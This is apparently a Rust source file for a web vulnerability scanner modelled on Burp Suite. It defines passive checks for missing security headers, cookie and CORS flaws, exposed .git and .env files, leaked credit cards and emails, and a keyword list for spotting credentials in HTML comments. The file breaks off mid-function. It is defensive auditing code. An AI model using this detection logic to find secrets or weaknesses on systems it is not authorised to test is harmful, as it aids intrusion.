// Scanner: live passive checks + light active scans, mirroring the original's
// defaults from burpsuite.jar resources/Preferences (MECHANICS.md, Scanner section).

use std::sync::atomic::Ordering;
use std::sync::Arc;

use crate::net::{self, HistEntry, Shared};
use crate::util;

/// Burp active-check families ported for D-02 (PHP echo-based code
/// injection, stored XSS, client-side template injection, the out-of-band
/// half of XML injection): pure functions over send closures.
#[path = "active_checks.rs"]
pub(crate) mod active_checks;

/// The active-scan check interface (`PointCheck`, `RequestCheck`), the check
/// registries and the scan context `start_active_scan` drives them with.
#[path = "scan_checks.rs"]
pub(crate) mod checks;

/// Insertion points: Burp's point types, builder, vetoes, payload placement
/// and point wording (burp.Zbg8, Zuq, Zwez, Zfw9, Zsg0).
#[path = "insertion.rs"]
pub(crate) mod insertion;
pub(crate) use insertion::{audit_points, inject, inject_payload, InsertionPoint, IpKind};
#[cfg(test)]
pub(crate) use insertion::{insertion_points, NameSite, SYNTH_REFERER};

/// AuditDefaults.json misc_insertion_point_options.max_insertion_points_per_base_request
pub const MAX_INSERTION_POINTS: usize = 30;
/// CrawlDefaults.json crawl_limits.maximum_unique_locations
pub const CRAWL_MAX_UNIQUE_LOCATIONS: usize = 1500;

/// The first three entries are the SQL probes used by the light active scan;
/// the rest are passive stack-trace / error-message signatures.
const ERROR_SIGNATURES: [(&str, &str); 12] = [
    ("SQL syntax", "SQL error message in response"),
    ("SQLite3::", "SQLite error message in response"),
    ("ORA-", "Oracle database error message in response"),
    ("PHP Warning", "PHP runtime warning in response"),
    ("System.Exception", "Server exception message in response"),
    ("Stack Trace", "Stack trace disclosed in response"),
    ("Warning: mysql_", "MySQL warning in response"),
    ("Traceback (most recent call last)", "Python stack trace disclosed in response"),
    ("at java.", "Java stack trace disclosed in response"),
    ("goroutine 1 [running]:", "Go stack trace disclosed in response"),
    ("Fatal error:", "PHP fatal error disclosed in response"),
    ("Notice: Undefined", "PHP notice disclosed in response"),
];

const SECRET_KEYWORDS: [(&str, &str); 6] = [
    ("password", "Possible credential reference in HTML comment"),
    ("passwd", "Possible credential reference in HTML comment"),
    ("secret", "Possible secret reference in HTML comment"),
    ("api_key", "Possible API key reference in HTML comment"),
    ("apikey", "Possible API key reference in HTML comment"),
    ("TODO:", "Developer note in HTML comment"),
];

/// Largest response body slice inspected by any passive check. Burp also caps
/// the work it does per response; 256 KB keeps huge downloads cheap.
pub const MAX_BODY_SCAN: usize = 256 * 1024;

/// Stable descriptor for one passive check: the report shows name + severity,
/// while `id` and `confidence` stay fixed for tests, exports and dedupe.
#[derive(Clone, Copy)]
pub struct CheckDef {
    pub id: &'static str,
    pub name: &'static str,
    pub sev: &'static str,
    /// Burp vocabulary: Certain | Firm | Tentative.
    pub confidence: &'static str,
}

const CH_HSTS: CheckDef = CheckDef { id: "passive.hsts-missing", name: "Strict transport security not enforced", sev: "low", confidence: "Certain" };
const CH_CLEARTEXT: CheckDef = CheckDef { id: "passive.unencrypted-communications", name: "Unencrypted communications", sev: "low", confidence: "Certain" };
const CH_CSP: CheckDef = CheckDef { id: "passive.csp-missing", name: "Content security policy (CSP) header not set", sev: "low", confidence: "Certain" };
const CH_FRAME: CheckDef = CheckDef { id: "passive.frame-ancestors-missing", name: "Frameable response (potential Clickjacking)", sev: "info", confidence: "Firm" };
const CH_XCTO: CheckDef = CheckDef { id: "passive.x-content-type-options-missing", name: "X-Content-Type-Options header missing", sev: "low", confidence: "Certain" };
const CH_REFERRER: CheckDef = CheckDef { id: "passive.referrer-policy-missing", name: "Referrer-Policy header not set", sev: "low", confidence: "Certain" };
const CH_PERMISSIONS: CheckDef = CheckDef { id: "passive.permissions-policy-missing", name: "Permissions policy header not set", sev: "low", confidence: "Certain" };
const CH_SERVER: CheckDef = CheckDef { id: "passive.server-version", name: "Server header discloses version", sev: "info", confidence: "Firm" };
const CH_XPB: CheckDef = CheckDef { id: "passive.x-powered-by", name: "X-Powered-By header discloses technology", sev: "info", confidence: "Firm" };
const CH_ASPNET: CheckDef = CheckDef { id: "passive.aspnet-version", name: "ASP.NET version disclosure", sev: "info", confidence: "Certain" };
const CH_COOKIE_HTTPONLY: CheckDef = CheckDef { id: "passive.cookie-httponly-missing", name: "Cookie without HttpOnly flag set", sev: "low", confidence: "Firm" };
const CH_COOKIE_SECURE: CheckDef = CheckDef { id: "passive.cookie-secure-missing", name: "TLS cookie without secure flag set", sev: "low", confidence: "Firm" };
const CH_COOKIE_SAMESITE: CheckDef = CheckDef { id: "passive.cookie-samesite-missing", name: "Cookie without SameSite attribute", sev: "low", confidence: "Firm" };
const CH_COOKIE_SAMESITE_NONE: CheckDef = CheckDef { id: "passive.cookie-samesite-none-insecure", name: "SameSite=None cookie without Secure attribute", sev: "low", confidence: "Firm" };
const CH_CORS_WILDCARD: CheckDef = CheckDef { id: "passive.cors-wildcard-origin", name: "CORS misconfiguration: wildcard origin", sev: "low", confidence: "Firm" };
const CH_CORS_WILDCARD_CREDS: CheckDef = CheckDef { id: "passive.cors-wildcard-origin-credentials", name: "CORS misconfiguration: wildcard origin with credentials", sev: "medium", confidence: "Firm" };
const CH_CORS_REFLECT: CheckDef = CheckDef { id: "passive.cors-reflected-origin", name: "CORS misconfiguration: arbitrary origin reflected", sev: "low", confidence: "Firm" };
const CH_CORS_CREDS: CheckDef = CheckDef { id: "passive.cors-reflected-origin-credentials", name: "CORS misconfiguration: reflected origin with credentials", sev: "high", confidence: "Firm" };
const CH_CORS_NULL: CheckDef = CheckDef { id: "passive.cors-null-origin", name: "CORS misconfiguration: null origin allowed", sev: "medium", confidence: "Firm" };
const CH_DIR_LISTING: CheckDef = CheckDef { id: "passive.directory-listing", name: "Directory listing", sev: "low", confidence: "Firm" };
const CH_GIT: CheckDef = CheckDef { id: "passive.git-directory-exposed", name: "Exposed .git directory", sev: "high", confidence: "Certain" };
const CH_ENV: CheckDef = CheckDef { id: "passive.env-file-exposed", name: "Exposed .env file", sev: "high", confidence: "Certain" };
const CH_LOGIN_HTTP: CheckDef = CheckDef { id: "passive.login-form-http", name: "Cleartext submission of password", sev: "medium", confidence: "Firm" };
const CH_MIXED: CheckDef = CheckDef { id: "passive.mixed-content", name: "Mixed content", sev: "low", confidence: "Firm" };
const CH_CACHE: CheckDef = CheckDef { id: "passive.cacheable-https-response", name: "Cacheable HTTPS response", sev: "low", confidence: "Tentative" };
const CH_REDIRECT_COOKIE: CheckDef = CheckDef { id: "passive.session-cookie-cross-host-redirect", name: "Session cookie sent on cross-host redirect", sev: "medium", confidence: "Firm" };
const CH_AUTOCOMPLETE: CheckDef = CheckDef { id: "passive.password-autocomplete", name: "Password field with autocomplete enabled", sev: "low", confidence: "Firm" };
const CH_EMAIL: CheckDef = CheckDef { id: "passive.email-disclosed", name: "Email addresses disclosed", sev: "info", confidence: "Certain" };
// Live 52685 (Juice Shop /rest/admin/application-configuration): Certain.
const CH_PRIVATE_IP: CheckDef = CheckDef { id: "passive.private-ip-disclosed", name: "Private IP addresses disclosed", sev: "info", confidence: "Certain" };
const CH_CREDIT_CARD: CheckDef = CheckDef { id: "passive.credit-card-disclosed", name: "Credit card numbers disclosed", sev: "medium", confidence: "Firm" };
const CH_OPENAPI_PASSIVE: CheckDef = CheckDef { id: "passive.openapi-definition", name: "OpenAPI definition found (passive scan check)", sev: "info", confidence: "Certain" };
const CH_HTML_NO_CHARSET: CheckDef = CheckDef { id: "passive.html-no-charset", name: "HTML does not specify charset", sev: "info", confidence: "Certain" };
const CH_HTML_BAD_CHARSET: CheckDef = CheckDef { id: "passive.html-unrecognized-charset", name: "HTML uses unrecognized charset", sev: "info", confidence: "Certain" };
const CH_CT_MISSING: CheckDef = CheckDef { id: "passive.content-type-missing", name: "Content type is not specified", sev: "info", confidence: "Certain" };
const CH_CT_MULTI: CheckDef = CheckDef { id: "passive.content-type-multiple", name: "Multiple content types specified", sev: "info", confidence: "Certain" };
const CH_ROBOTS: CheckDef = CheckDef { id: "passive.robots-txt", name: "Robots.txt file", sev: "info", confidence: "Certain" };
const CH_CSRF: CheckDef = CheckDef { id: "passive.csrf-form-token-missing", name: "CSRF token missing on form with password field", sev: "medium", confidence: "Firm" };

/// Every passive check the engine knows, in report order.
static PASSIVE_LIBRARY: &[CheckDef] = &[
    CH_HSTS, CH_CSP, CH_FRAME, CH_XCTO, CH_REFERRER, CH_PERMISSIONS,
    CH_SERVER, CH_XPB, CH_ASPNET,
    CH_COOKIE_HTTPONLY, CH_COOKIE_SECURE, CH_COOKIE_SAMESITE, CH_COOKIE_SAMESITE_NONE,
    CH_CORS_WILDCARD, CH_CORS_WILDCARD_CREDS, CH_CORS_REFLECT, CH_CORS_CREDS, CH_CORS_NULL,
    CH_DIR_LISTING, CH_GIT, CH_ENV, CH_LOGIN_HTTP, CH_MIXED, CH_CACHE,
    CH_REDIRECT_COOKIE, CH_AUTOCOMPLETE, CH_EMAIL, CH_PRIVATE_IP, CH_CREDIT_CARD, CH_ROBOTS,
    CH_OPENAPI_PASSIVE, CH_HTML_NO_CHARSET, CH_HTML_BAD_CHARSET, CH_CT_MISSING, CH_CT_MULTI,
];

/// burp.Zf9p.ZY: charsets Burp recognizes.
const KNOWN_CHARSETS: [&str; 10] = ["utf-8", "us-ascii", "iso8859-1", "iso8859-2", "iso8859-15", "iso-8859-1", "iso-8859-2", "iso-8859-15", "windows-1250", "windows-1252"];

/// burp.Zf9p: content-type and charset statements of one response.
fn mime_issues(resp: &[u8]) -> Vec<CheckDef> {
    let p = util::parse_http(resp);
    let status: u16 = p.first.split_whitespace().nth(1).and_then(|x| x.parse().ok()).unwrap_or(0);
    if (300..400).contains(&status) || status == 204 {
        return Vec::new();
    }
    let body = &resp[p.head_len.min(resp.len())..];
    let cts: Vec<&String> = p.headers.iter().filter(|(k, _)| k.eq_ignore_ascii_case("content-type")).map(|(_, v)| v).collect();
    let mut out = Vec::new();
    if cts.is_empty() {
        if !body.is_empty() {
            out.push(CH_CT_MISSING);
        }
        return out;
    }
    let essences: std::collections::BTreeSet<String> = cts.iter().map(|v| v.split(';').next().unwrap_or("").trim().to_ascii_lowercase()).collect();
    if essences.len() > 1 {
        out.push(CH_CT_MULTI);
    }
    if essences.iter().any(|e| e == "text/html") && !body.is_empty() {
        let mut charsets: Vec<String> = cts
            .iter()
            .flat_map(|v| v.split(';').skip(1))
            .filter_map(|p| p.trim().strip_prefix("charset=").or_else(|| p.trim().strip_prefix("Charset=")).map(|c| c.trim_matches('"').to_ascii_lowercase()))
            .collect();
        let low = String::from_utf8_lossy(&body[..body.len().min(4096)]).to_ascii_lowercase();
        if let Some(i) = low.find("<meta") {
            for tag in low[i..].split("<meta").skip(1).take(20) {
                let tag = tag.split('>').next().unwrap_or("");
                if let Some(c) = tag.split("charset=").nth(1) {
                    let c = c.trim_start_matches(['"', '\'']).split(['"', '\'', ' ', '/', ';']).next().unwrap_or("");
                    if !c.is_empty() {
                        charsets.push(c.to_string());
                    }
                }
            }
        }
        if charsets.is_empty() {
            out.push(CH_HTML_NO_CHARSET);
        } else if charsets.iter().any(|c| !KNOWN_CHARSETS.contains(&c.as_str())) {
            out.push(CH_HTML_BAD_CHARSET);
        }
    }
    out
}

/// The passive check library (ids, names, severities, confidences).
pub fn check_library() -> &'static [CheckDef] {
    PASSIVE_LIBRARY
}

/// Largest request or response kept as issue evidence; longer messages are
/// truncated to this many bytes.
pub const EVIDENCE_MAX_BYTES: usize = 256 * 1024;

/// One exchange that confirmed an issue: the probe as sent and the response
/// it got (None when the target did not answer, or not known yet). Shared,
/// so cloning an issue does not copy the bytes.
#[derive(Clone, Debug, PartialEq)]
pub struct ScanEvidence {
    pub request: Arc<[u8]>,
    pub response: Option<Arc<[u8]>>,
}

impl ScanEvidence {
    /// A bounded copy: each message is cut at [`EVIDENCE_MAX_BYTES`].
    pub fn new(request: &[u8], response: Option<&[u8]>) -> Self {
        let cap = |b: &[u8]| -> Arc<[u8]> { Arc::from(&b[..b.len().min(EVIDENCE_MAX_BYTES)]) };
        ScanEvidence { request: cap(request), response: response.map(cap) }
    }
}

#[derive(Clone, Default)]
pub struct ScanIssue {
    pub id: u64,
    pub sev: String, // high | medium | low | info (DarkTheme.json ui.issue colors)
    pub name: String,
    pub host: String,
    pub path: String,
    pub detail: String,
    /// Burp lets the user classify an issue as a false positive
    /// (build 52685 burp.Ze1r line 12 returns "False positive").
    pub false_positive: bool,
    /// Burp vocabulary: Certain | Firm | Tentative.
    pub confidence: String,
    /// When the issue was reported (unix seconds), Burp's "Time" column.
    pub ts: u64,
    /// Burp's numeric issue type (KnowledgeBase `typeIndex`) for an issue
    /// name Burp knows, otherwise 0 (see [`issue_type_id`]).
    pub type_id: u64,
    /// The exchange(s) that confirmed the issue: the probe and its response
    /// for an active check (several when a control or a retrieval request is
    /// part of the proof), the audited exchange for a passive check. Empty
    /// for issues loaded from a project file and for checks that do not
    /// attach evidence yet.
    pub evidence: Vec<ScanEvidence>,
}

impl ScanIssue {
    pub(crate) fn with_evidence(mut self, evidence: Vec<ScanEvidence>) -> Self {
        self.evidence = evidence;
        self
    }
}

/// Burp's numeric issue type for `name` (resources/KnowledgeBase/Issues
/// `typeIndex`, the names in kb_issue_names.txt), or 0 when Burp has no such
/// issue (WebProbe's own checks).
pub fn issue_type_id(name: &str) -> u64 {
    checks::KB_ISSUE_TYPES.iter().find(|(n, _)| *n == name).map(|(_, t)| *t).unwrap_or(0)
}

fn mk(sev: &str, name: &str, e: &HistEntry, detail: impl Into<String>) -> ScanIssue {
    ScanIssue {
        id: 0, // assigned by add_issues
        sev: sev.to_string(),
        name: name.into(),
        host: e.host.clone(),
        // Burp keys issues by URL path without the query string.
        path: e.path.split('?').next().unwrap_or("").to_string(),
        detail: detail.into(),
        false_positive: false,
        confidence: "Firm".into(),
        ts: util::now_secs(),
        type_id: issue_type_id(name),
        evidence: Vec::new(),
    }
}

/// An issue for a check ported from Burp: `kb_name` is the exact issue name
/// in Burp's KnowledgeBase (resources/KnowledgeBase/Issues/*.json), so the
/// Issues table matches Burp's; severity and confidence are what the live
/// Burp scanner reported for the same finding (parity lab, fnd_54).
fn mk_burp(kb_name: &str, sev: &str, confidence: &str, e: &HistEntry, param: &str, detail: impl Into<String>) -> ScanIssue {
    let mut i = mk(sev, kb_name, e, format!("Parameter {param}: {}", detail.into()));
    i.confidence = confidence.into();
    i
}

/// [`mk_burp`] for an insertion-point check: the detail starts with Burp's
/// wording for the point (burp.Zsg0.ZD), "The value of the q request
/// parameter: ...", "The name of an arbitrarily supplied URL parameter: ...".
fn mk_point(kb_name: &str, sev: &str, confidence: &str, e: &HistEntry, ip: &InsertionPoint, detail: impl Into<String>) -> ScanIssue {
    let mut i = mk(sev, kb_name, e, format!("The {}: {}", ip.describe(), detail.into()));
    i.confidence = confidence.into();
    i
}

/// Match the interactions `collab` recorded since the last call and add the
/// issues they prove (see `oob::OobState::match_new`). Called every frame by
/// whoever owns the Collaborator, whatever view is open.
pub fn match_new_interactions(shared: &Shared, collab: &crate::collaborator::CollaboratorState) -> usize {
    let issues = shared.oob.match_new(collab);
    let n = issues.len();
    if n > 0 {
        add_issues(shared, issues);
    }
    n
}

/// Match `interactions` against the pending ids and add the issues proved.
pub fn match_oob_interactions(shared: &Shared, interactions: &[crate::collaborator::Interaction]) -> usize {
    let issues = shared.oob.match_interactions(interactions);
    let n = issues.len();
    if n > 0 {
        add_issues(shared, issues);
    }
    n
}

pub fn add_issues(shared: &Shared, mut issues: Vec<ScanIssue>) {
    if issues.is_empty() {
        return;
    }
    let mut iss = shared.issues.lock().unwrap();
    for issue in issues.iter_mut() {
        issue.id = shared.next_id.fetch_add(1, Ordering::SeqCst);
        // Issues renamed after construction (the Collaborator matcher)
        // get their type from the final name. Every issue is kept, as in
        // Burp: the list used to drop the oldest past 500, triaged High
        // findings included.
        if issue.type_id == 0 {
            issue.type_id = issue_type_id(&issue.name);
        }
        iss.push(issue.clone());
    }
    shared.log(&format!("Scanner reported {} issue(s)", issues.len()));
}

/// Passive issues consolidated like the original (AuditDefaults.json
/// scanner.audit_optimization.consolidate_passive_issues = true, and
/// ConsolidationAction.KEEP_EXISTING for duplicates): the first instance of an
/// issue with the same severity + name + service + base URL is kept.
/// Burp's KnowledgeBase issue names (resources/KnowledgeBase/Issues/*.json).
const KB_ISSUE_NAMES: &str = include_str!("kb_issue_names.txt");

/// True when `name` is an issue type Burp itself can report.
pub fn is_burp_issue(name: &str) -> bool {
    KB_ISSUE_NAMES.lines().any(|l| l == name)
}

pub fn add_passive_issues(shared: &Shared, mut issues: Vec<ScanIssue>) {
    // WebProbe-only passive checks (no Burp KnowledgeBase entry) stay off
    // unless Settings > Scanner > "WebProbe extra checks" is on, so the
    // default issue list is the one Burp would produce.
    if !shared.extra_checks.load(Ordering::SeqCst) {
        issues.retain(|i| is_burp_issue(&i.name));
    }
    if issues.is_empty() {
        return;
    }
    let mut iss = shared.issues.lock().unwrap();
    let key = |i: &ScanIssue| format!("{}|{}|{}|{}", i.sev, i.name, i.host, i.path);
    let before = issues.len();
    let mut seen = std::collections::BTreeSet::new();
    issues.retain(|i| seen.insert(key(i)));
    let mut known: std::collections::BTreeSet<String> =
        iss.iter().map(&key).collect();
    issues.retain(|i| known.insert(key(i)));
    let incoming = issues.len();
    for issue in issues.iter_mut() {
        issue.id = shared.next_id.fetch_add(1, Ordering::SeqCst);
        iss.push(issue.clone());
    }
    if incoming > 0 {
        shared.log(&format!("Scanner reported {} new issue(s) ({} consolidated)", incoming, before - incoming));
    }
}

fn mk_check(c: CheckDef, e: &HistEntry, detail: impl Into<String>) -> ScanIssue {
    let mut i = mk(c.sev, c.name, e, detail);
    i.confidence = c.confidence.into();
    i
}

fn has_header(headers: &[(String, String)], name: &str) -> bool {
    util::get_header(headers, name).is_some()
}

/// Body bytes that passive checks are allowed to look at (first 256 KB).
fn body_slice(resp: &[u8], head_len: usize) -> &[u8] {
    let start = head_len.min(resp.len());
    &resp[start..(start + MAX_BODY_SCAN).min(resp.len())]
}

/// Burp skips binary content; so do we (content type first, then NUL bytes).
fn is_binary(content_type: &str, body: &[u8]) -> bool {
    let ct = content_type.to_ascii_lowercase();
    let textual = ct.is_empty()
        || ct.starts_with("text/")
        || ct.contains("json")
        || ct.contains("xml")
        || ct.contains("javascript")
        || ct.contains("html")
        || ct.contains("x-www-form-urlencoded");
    if !textual {
        return true;
    }
    body.iter().take(1024).any(|b| *b == 0)
}

/// Whether Burp's body sniffer gives up on the response (MIME "unknown", code 1).
/// burp.Zh63.Zi caps the message at head + 10000 bytes; burp.Zmb7 skips a BOM
/// (Zh0p) and counts body bytes that are < 32 as a *signed* Java byte, other
/// than tab/LF/CR (so every UTF-8 byte >= 0x80 counts); at 10 + len/100 of
/// them the body is binary (Zm5t.ZW false). The JSON, script, CSS and text
/// sniffers then fail; a document that starts with <!doctype html, <html,
/// <head or <?xml is still recognised (runtime-probed against build 52685).
/// For JSON/HTML/XML/JS stated types Burp's audited MIME is the sniffed one
/// (Zh63.Zj), so an unknown sniff limits the information-disclosure checks
/// (burp.Zbz9) to the response headers.
fn burp_sniff_unknown(resp: &[u8], head_len: usize) -> bool {
    let head_len = head_len.min(resp.len());
    let total = resp.len().min(head_len + 10_000);
    let mut start = head_len;
    for bom in [&[0xEF, 0xBB, 0xBF][..], &[0xFE, 0xFF, 0, 0], &[0xFF, 0xFE, 0, 0], &[0xFE, 0xFF], &[0xFF, 0xFE]] {
        if resp[start..total].starts_with(bom) {
            start += bom.len();
            break;
        }
    }
    let threshold = 10 + total / 100;
    let count = resp[start..total].iter().filter(|&&b| (b as i8) < 32 && !matches!(b, 9 | 10 | 13)).take(threshold).count();
    if count < threshold {
        return false;
    }
    let lead: Vec<u8> = resp[start..total].iter().skip_while(|b| b.is_ascii_whitespace()).take(16).map(|b| b.to_ascii_lowercase()).collect();
    !(lead.starts_with(b"<!doctype html") || lead.starts_with(b"<html") || lead.starts_with(b"<head") || lead.starts_with(b"<?xml"))
}

/// Checks that only make sense for a browsable document (HTML).
fn is_document(content_type: &str) -> bool {
    let ct = content_type.to_ascii_lowercase();
    ct.contains("text/html") || ct.contains("application/xhtml") || ct.is_empty()
}

struct CookieParts<'a> {
    name: &'a str,
    value: &'a str,
    attrs: Vec<String>,
}

fn parse_cookie(val: &str) -> CookieParts<'_> {
    let mut it = val.split(';');
    let first = it.next().unwrap_or("").trim();
    let mut kv = first.splitn(2, '=');
    CookieParts {
        name: kv.next().unwrap_or("").trim(),
        value: kv.next().unwrap_or("").trim(),
        attrs: it.map(|a| a.trim().to_ascii_lowercase()).collect(),
    }
}

fn has_flag(attrs: &[String], flag: &str) -> bool {
    attrs.iter().any(|a| a == flag)
}

fn attr_value<'a>(attrs: &'a [String], name: &str) -> Option<&'a str> {
    attrs.iter().find_map(|a| {
        let mut it = a.splitn(2, '=');
        if it.next() == Some(name) {
            Some(it.next().unwrap_or(""))
        } else {
            None
        }
    })
}

/// Session-looking cookies: name tokens or long opaque values.
fn looks_session_cookie(name: &str, value: &str) -> bool {
    const TOKENS: [&str; 10] = [
        "sess", "sid", "jsession", "phpsess", "aspsession", "token", "auth", "jwt", "login",
        "remember",
    ];
    let n = name.to_ascii_lowercase();
    if TOKENS.iter().any(|t| n.contains(t)) {
        return true;
    }
    value.len() >= 24
        && value
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || "-_.~%+/=".contains(c))
}

/// Every `<name ...>` tag of a lower-cased HTML body, capped at 200 tags.
fn tags<'a>(low: &'a str, name: &str) -> Vec<&'a str> {
    let pat = format!("<{name}");
    let mut out = Vec::new();
    let mut i = 0;
    while let Some(off) = low[i..].find(&pat) {
        let s = i + off;
        let end = low[s..].find('>').map(|e| s + e + 1).unwrap_or(low.len());
        out.push(&low[s..end]);
        i = end;
        if out.len() >= 200 {
            break;
        }
    }
    out
}

/// burp.Zeyc.ZJ: the page links to something (a URL attribute on one of the
/// elements Burp walks: a, area, base, link, img, script, iframe, frame,
/// embed, object, applet, bgsound, sound, body background, meta refresh).
fn has_url_element(low: &str) -> bool {
    let with = |tag: &str, attrs: &[&str]| tags(low, tag).iter().any(|t| {
        let name_end = 1 + tag.len();
        t.as_bytes().get(name_end).map(|c| c.is_ascii_whitespace() || *c == b'>' || *c == b'/').unwrap_or(false)
            && attrs.iter().any(|a| t.contains(&format!(" {a}=")) || t.contains(&format!("\n{a}=")))
    });
    with("a", &["href"])
        || with("area", &["href"])
        || with("base", &["href"])
        || with("link", &["href"])
        || with("img", &["src"])
        || with("script", &["src"])
        || with("iframe", &["src"])
        || with("frame", &["src"])
        || with("embed", &["src"])
        || with("object", &["data", "codebase"])
        || with("applet", &["code", "codebase", "archive"])
        || with("bgsound", &["src"])
        || with("sound", &["src"])
        || with("body", &["background"])
        || tags(low, "meta").iter().any(|t| t.contains("refresh") && t.contains("url="))
}

fn has_password_input(low: &str) -> bool {
    tags(low, "input").iter().any(|t| {
        t.contains("type=\"password\"") || t.contains("type='password'") || t.contains("type=password")
    })
}

/// First plausible e-mail address in the text (Burp: "Email addresses disclosed").
/// Burp's built-in top-level domain list (burp.Zflt.Zh, runtime-dumped).
const BURP_TLDS: &str = include_str!("burp_tlds.txt");

/// Burp's TLD list as a set, built once (it is consulted for every
/// '@' in every response body).
fn burp_tld_set() -> &'static std::collections::HashSet<&'static str> {
    static SET: std::sync::OnceLock<std::collections::HashSet<&'static str>> = std::sync::OnceLock::new();
    SET.get_or_init(|| BURP_TLDS.lines().map(str::trim).filter(|l| !l.is_empty()).collect())
}

/// burp.Zflt.Zb: email addresses in `text`. The local part is 1-40 bytes of
/// [alnum - . _ +] before '@'; the domain is at least two labels of
/// [alnum -], each 2-63 long and not starting or ending with '-', at most 255
/// in total, and the last label must be one of Burp's TLDs.
fn find_emails(text: &str) -> Vec<String> {
    let b = text.as_bytes();
    let n = b.len();
    let mut out = Vec::new();
    let mut from = 0;
    while let Some(off) = text[from..].find('@') {
        let at = from + off;
        from = at + 1;
        let local_ok = |c: u8| c.is_ascii_alphanumeric() || matches!(c, b'-' | b'.' | b'_' | b'+');
        let mut ls = at;
        while ls > 0 && at - ls < 40 && local_ok(b[ls - 1]) {
            ls -= 1;
        }
        if at - ls < 1 || (ls > 0 && local_ok(b[ls - 1])) {
            continue;
        }
        // Domain labels.
        let mut labels: Vec<(usize, usize)> = Vec::new();
        let mut k = at + 1;
        loop {
            let st = k;
            while k < n && (b[k].is_ascii_alphanumeric() || b[k] == b'-') && k - st <= 64 {
                k += 1;
            }
            let len = k - st;
            if !(2..=63).contains(&len) || b[st] == b'-' || b[k - 1] == b'-' {
                break;
            }
            labels.push((st, k));
            if k < n && b[k] == b'.' && k + 1 < n && b[k + 1].is_ascii_alphanumeric() {
                k += 1;
                continue;
            }
            break;
        }
        if labels.len() < 2 {
            continue;
        }
        let end = labels.last().unwrap().1;
        if end - (at + 1) > 255 {
            continue;
        }
        let (ts, te) = *labels.last().unwrap();
        let tld = text[ts..te].to_ascii_lowercase();
        if !burp_tld_set().contains(tld.as_str()) {
            continue;
        }
        out.push(text[ls..end].to_string());
        from = end;
    }
    out
}

/// The first email Burp would report: not one the request itself contained
/// (burp.Zpwx.ZL excludes addresses found in the request).
fn find_email_excluding(text: &str, request: &str) -> Option<String> {
    let req: Vec<String> = find_emails(request).into_iter().map(|e| e.to_ascii_lowercase()).collect();
    find_emails(text).into_iter().find(|e| !req.contains(&e.to_ascii_lowercase()))
}

#[allow(dead_code)]
fn find_email(text: &str) -> Option<String> {
    find_emails(text).into_iter().next()
}

/// First RFC1918 address in the text (Burp: "Private IP addresses disclosed").
fn find_private_ip(text: &str) -> Option<String> {
    for tok in text.split(|c: char| !(c.is_ascii_digit() || c == '.')) {
        let parts: Vec<&str> = tok.split('.').collect();
        if parts.len() != 4 || tok.len() > 15 {
            continue;
        }
        let nums: Option<Vec<u8>> = parts.iter().map(|p| p.parse::<u8>().ok()).collect();
        let Some(n) = nums else { continue };
        let private = n[0] == 10
            || (n[0] == 192 && n[1] == 168)
            || (n[0] == 172 && (16..=31).contains(&n[1]));
        if private {
            return Some(tok.to_string());
        }
    }
    None
}

fn luhn_ok(digits: &[u8]) -> bool {
    let mut sum = 0u32;
    for (i, d) in digits.iter().rev().enumerate() {
        let mut v = (d - b'0') as u32;
        if i % 2 == 1 {
            v *= 2;
            if v > 9 {
                v -= 9;
            }
        }
        sum += v;
    }
    sum % 10 == 0
}

/// First Luhn-valid 13-19 digit run with a card-like prefix.
/// burp.Zu0p.Zu: card numbers in a response body. A run starts at a digit
/// that follows a non-alphanumeric byte, takes up to 16 digits with at most
/// three consecutive ' ' / '-' separators, must be 13-16 digits followed by a
/// non-alphanumeric byte, and must pass Burp's per-length issuer prefixes
/// (Zu0p.Zd) and the Luhn check (Zu0p.ZX).
fn find_card(text: &str) -> Option<String> {
    let b = text.as_bytes();
    let n = b.len();
    let alnum = |c: u8| c.is_ascii_alphanumeric();
    let mut i = 0usize;
    let mut boundary = true;
    while n >= 13 && i < n - 12 {
        let c = b[i];
        if c.is_ascii_digit() && boundary {
            let mut j = i + 1;
            let mut digits = 1;
            let mut seps = 0;
            while j < n && seps <= 3 && digits < 16 {
                let d = b[j];
                if d.is_ascii_digit() {
                    digits += 1;
                    seps = 0;
                } else if d == b' ' || d == b'-' {
                    seps += 1;
                } else {
                    break;
                }
                j += 1;
            }
            if (13..=16).contains(&digits) && (j >= n || !alnum(b[j])) {
                let num: String = text[i..j].chars().filter(|c| c.is_ascii_digit()).collect();
                if card_prefix_ok(&num) && luhn_ok(num.as_bytes()) {
                    return Some(text[i..j].trim().to_string());
                }
            }
            i = j;
            boundary = false;
            continue;
        }
        boundary = !alnum(c);
        i += 1;
    }
    None
}

/// burp.Zu0p.Zd: issuer prefixes per length.
fn card_prefix_ok(n: &str) -> bool {
    let p = |x: &str| n.starts_with(x);
    match n.len() {
        13 => p("4"),
        14 => ["300", "301", "302", "303", "304", "305", "36", "38"].iter().any(|x| p(x)),
        15 => ["34", "37", "2131", "1800"].iter().any(|x| p(x)),
        16 => ["4", "5", "6011", "65", "35"].iter().any(|x| p(x)),
        _ => false,
    }
}

/// Host of an absolute Location URL; None for relative redirects.
fn location_host(loc: &str) -> Option<String> {
    let rest = loc.split("://").nth(1)?;
    let authority = rest.split(['/', '?', '#']).next().unwrap_or("");
    let host = authority.rsplit('@').next().unwrap_or(authority);
    let host = host.split(':').next().unwrap_or(host);
    if host.is_empty() {
        None
    } else {
        Some(host.to_ascii_lowercase())
    }
}

/// Passive audit of one stored message (run for every proxied exchange when enabled).
/// Passive audit of one exchange. Every issue carries that exchange as its
/// evidence (one shared, bounded copy).
pub fn passive_check(e: &HistEntry) -> Vec<ScanIssue> {
    let mut v = passive_issues(e);
    if !v.is_empty() {
        let ev = ScanEvidence::new(&e.req_raw, e.resp_raw.as_deref());
        for i in &mut v {
            i.evidence = vec![ev.clone()];
        }
    }
    v
}

fn passive_issues(e: &HistEntry) -> Vec<ScanIssue> {
    let mut v: Vec<ScanIssue> = Vec::new();
    let Some(resp) = &e.resp_raw else { return v };
    let p = util::parse_http(resp);
    let req = util::parse_http(&e.req_raw);
    let ok_status = p.status.starts_with('2') || p.status.starts_with('3');
    let ct = util::get_header(&p.headers, "Content-Type").unwrap_or_default();
    let body = body_slice(resp, p.head_len);
    let binary = is_binary(&ct, body);
    let html = is_document(&ct) && !binary;
    let text = if binary { String::new() } else { String::from_utf8_lossy(body).into_owned() };
    let low = text.to_ascii_lowercase();

    // CSRF: a password-bearing POST form without an anti-CSRF token field
    // (burp.Zbjf SCANNER_ACTIVE_CHECKS_CSRF; passive variant of the family).
    {
        let req_body = String::from_utf8_lossy(body_slice(&e.req_raw, req.head_len.min(e.req_raw.len()))).to_lowercase();
